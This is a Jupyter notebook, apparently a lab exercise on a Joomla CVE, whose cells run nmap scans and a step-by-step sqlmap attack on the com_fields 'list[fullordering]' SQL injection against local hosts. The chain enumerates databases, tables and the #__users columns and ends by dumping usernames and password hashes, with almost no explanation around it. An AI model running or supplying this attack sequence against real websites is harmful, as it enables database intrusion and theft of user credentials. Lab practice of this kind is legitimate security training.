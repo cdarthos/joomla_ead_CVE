{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "528c2778-58af-44cb-8689-8ca6a57bd837",
   "metadata": {
    "pycharm": {
     "name": "#%%\n"
    }
   },
   "outputs": [],
   "source": [
    "import os"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "dae44a7c",
   "metadata": {
    "collapsed": false,
    "jupyter": {
     "outputs_hidden": false
    },
    "pycharm": {
     "name": "#%%\n"
    }
   },
   "outputs": [],
   "source": []
  },
  {
   "cell_type": "markdown",
   "id": "06bc95f3",
   "metadata": {
    "pycharm": {
     "name": "#%% md\n"
    }
   },
   "source": [
    "Importation des module snecessaire"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "dbcba9df",
   "metadata": {
    "collapsed": false,
    "jupyter": {
     "outputs_hidden": false
    },
    "pycharm": {
     "name": "#%%\n"
    }
   },
   "outputs": [],
   "source": [
    "os.system('nmap')"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "0dea2b9d-03ba-45ee-97ac-f72113343e79",
   "metadata": {},
   "source": [
    "Importation des module snecessaire"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "3690a709-65e3-4435-a5b6-2d040750c5f6",
   "metadata": {
    "pycharm": {
     "name": "#%%\n"
    }
   },
   "outputs": [],
   "source": [
    "os.system('nmap -u joomla370')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "07974e81-131d-4fb1-aa6b-cdb1c02ad787",
   "metadata": {
    "pycharm": {
     "name": "#%%\n"
    }
   },
   "outputs": [],
   "source": [
    "os.system('nmap -u joomla370 -p 80 --script vuln')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "bb36cbf5-9d64-4265-9152-09d0b8cfa005",
   "metadata": {
    "pycharm": {
     "name": "#%%\n"
    }
   },
   "outputs": [],
   "source": [
    "os.system('sqlmap -u \"http://joomla370/index.php?option=com_fields&view=fields&layout=modal\"')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "47593267-fd75-4f27-b0db-cf7a2a532d45",
   "metadata": {
    "pycharm": {
     "name": "#%%\n"
    }
   },
   "outputs": [],
   "source": [
    "os.system('sqlmap -hh')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "e954ad0d-55f2-4811-8ba5-a668f6e61910",
   "metadata": {
    "pycharm": {
     "name": "#%%\n"
    }
   },
   "outputs": [],
   "source": [
    "os.system('sqlmap -u \"http://joomla370/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=*\"')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "d02ffb65-f2b5-4164-81c9-a1708828c470",
   "metadata": {
    "pycharm": {
     "name": "#%%\n"
    }
   },
   "outputs": [],
   "source": [
    "os.system('sqlmap -u \"http://joomla370/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=*\" --dbs')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "77b04615-7fb2-4a37-b0e7-7f0318f4b312",
   "metadata": {
    "pycharm": {
     "name": "#%%\n"
    }
   },
   "outputs": [],
   "source": [
    "os.system('sqlmap -u \"http://joomla370/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=*\" -D ead_bd --tables')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "641efa21-c038-49e9-8c6c-1f2b761547ac",
   "metadata": {
    "pycharm": {
     "name": "#%%\n"
    }
   },
   "outputs": [],
   "source": [
    "os.system('sqlmap -u \"http://joomla370/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=*\" -D ead_bd -T \"#__users\" --columns')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "eabf8d78-25b4-4e96-bc72-d42126fd3fb4",
   "metadata": {
    "pycharm": {
     "name": "#%%\n"
    }
   },
   "outputs": [],
   "source": [
    "os.system('sqlmap -u \"http://joomla370/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=*\" -D information_schema --tables')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "498e6475-0c37-4d33-aaa8-677a127c7401",
   "metadata": {
    "pycharm": {
     "name": "#%%\n"
    }
   },
   "outputs": [],
   "source": [
    "os.system('sqlmap -u \"http://php/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=*\" -D information_schema -T COLUMNS --columns')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "5fc2a7d7-b580-469d-a1db-d094be20176b",
   "metadata": {
    "pycharm": {
     "name": "#%%\n"
    }
   },
   "outputs": [],
   "source": [
    "os.system('sqlmap -u \"http://php/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=*\" -D information_schema -T COLUMNS -C TABLE_NAME,COLUMN_NAME --dump')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "72dbadc7-4784-4f28-8b91-ec9bcbcd1b80",
   "metadata": {
    "pycharm": {
     "name": "#%%\n"
    }
   },
   "outputs": [],
   "source": [
    "os.system('cat /home/jovyan/.sqlmap/output/php/dump/information_schema/COLUMNS.csv | grep \"#__users\"')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "8787b998-e278-4d8e-8228-514e58e6d613",
   "metadata": {
    "pycharm": {
     "name": "#%%\n"
    }
   },
   "outputs": [],
   "source": [
    "os.system('sqlmap -u \"http://php/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=*\" -D ead_bd -T \"#__users\" -C username,password --dump')"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.10"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
